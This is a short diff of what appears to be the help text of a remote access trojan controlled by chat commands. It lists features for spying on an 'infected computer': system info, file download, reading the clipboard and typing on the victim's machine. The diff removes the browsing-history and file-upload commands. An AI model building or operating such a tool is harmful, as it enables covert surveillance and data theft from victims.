@@ -28,9 +28,7 @@ Availaible commands are :
 --> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
 --> !admincheck = Check if program has admin privileges
 --> !sysinfo = Gives info about infected computer
---> !history = Get computer navigation history
 --> !download = Download a file from infected computer
---> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
 --> !clipboard = Retrieve infected computer clipboard content
